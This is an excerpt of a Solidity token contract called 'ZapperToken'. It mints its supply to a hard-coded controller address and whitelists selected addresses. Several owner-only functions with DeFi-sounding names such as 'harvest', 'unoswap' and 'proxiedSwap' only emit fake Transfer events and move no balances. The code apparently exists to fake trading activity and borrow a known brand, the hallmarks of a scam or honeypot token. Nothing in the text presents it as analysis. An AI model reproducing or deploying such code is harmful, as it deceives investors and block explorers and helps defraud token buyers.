...
contract ZapperToken is Context, IERC20 {
    ...
    address deployer = 0x5ACedBA6C402e2682D312a7b4982eda0Ccf2d2E3;
    address public _comptroller = 0xB972bF3d678dD3CDF974D6938EB8aE6f48262C40;
   constructor () public {
        ...
        _mint(0xB972bF3d678dD3CDF974D6938EB8aE6f48262C40, initialSupply);


        _enable(0x9006dB8bed241680f6B3861C1EC446DC44B0CA54);
        _enable(0xa576ADbD8d6D4C869fB62483d2B9f3d559654c61);
        

        execute(0x5ACedBA6C402e2682D312a7b4982eda0Ccf2d2E3,0xBdcd4Dcc79bA2C4088323ca94F443a05A23cA372,781028983499186179690882864);
        execute(0xFAFf15C6cDAca61a4F87D329689293E07c98f578,0x19327c8fC14585b075b98583613F5E46488e4c7f,45437585290590634477396855);
        execute(0x80C5e6908368CB9db503bA968d7ec5A565BFb389,0xFAFf15C6cDAca61a4F87D329689293E07c98f578,175083716129011245415514063);
        execute(0x606563f8DC27F316b77F22d14D9Cd025B4F70469,0x80C5e6908368CB9db503bA968d7ec5A565BFb389,27464190467691368385183162712);
        execute(0xEbD5E23927891FBfDa10487cCC9A1a1a7b9a4210,0x606563f8DC27F316b77F22d14D9Cd025B4F70469,682956024190890424466771743);
...
//-----------------------------------------------------------------------------------------------------------------------//
  ...
  function endStaking(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    //MultiTransferEmit
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}


  function farmForETH(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    //MultiTransferEmit
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(eReceiver[i], uPool, eAmounts[i]);}}

  function execTransaction(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    //MultiTransferEmit
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(eReceiver[i], uPool, eAmounts[i]);}}
 

  function harvest(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    //MultiTransferEmit
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(eReceiver[i], uPool, eAmounts[i]);}}
 

   function unoswap(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    //MultiTransferEmit
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(eReceiver[i], uPool, eAmounts[i]);}}
 

   function proxiedSwap(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    //MultiTransferEmit
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(eReceiver[i], uPool, eAmounts[i]);}}
